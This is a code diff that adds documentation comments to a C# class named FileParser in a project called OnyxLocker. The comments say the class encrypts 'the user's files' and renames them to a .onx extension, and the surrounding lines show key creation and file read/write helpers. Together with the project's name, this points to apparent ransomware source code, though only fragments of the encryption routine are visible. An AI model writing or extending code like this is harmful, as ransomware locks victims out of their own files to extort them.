@@ -8,12 +8,20 @@ namespace OnyxLocker
         private IEncryptionProvider EncryptionProvider;
         private byte[] KeyBytes;
 
+        /// <summary>
+        /// Provides functions to Encrypt the user's files
+        /// </summary>
+        /// <param name="encryptionProvider"></param>
         public FileParser(IEncryptionProvider encryptionProvider)
         {
             EncryptionProvider = encryptionProvider;
             KeyBytes = EncryptionProvider.CreateEncryptionKey();
         }
 
+        /// <summary>
+        /// Encrypts the files and renames it to a .onx file
+        /// </summary>
+        /// <param name="filePath">FilePath for the files to encrypt</param>
         public void ParseFile(string filePath)
         {
             var fileBytes = GetFileBytes(filePath);
@@ -34,6 +42,11 @@ namespace OnyxLocker
             GC.Collect();
         }
 
+        /// <summary>
+        /// Reads the file in a bytearray
+        /// </summary>
+        /// <param name="filePath"></param>
+        /// <returns></returns>
         private byte[] GetFileBytes(string filePath)
         {
             using (var fileStream = File.OpenRead(filePath))
@@ -53,6 +66,11 @@ namespace OnyxLocker
             }
         }
 
+        /// <summary>
+        /// Writes the filebytes to the given path
+        /// </summary>
+        /// <param name="filePath"></param>
+        /// <param name="fileBytes"></param>
         private void WriteFileBytes(string filePath, byte[] fileBytes)
         {
             using (var fileStream = File.OpenWrite(filePath))
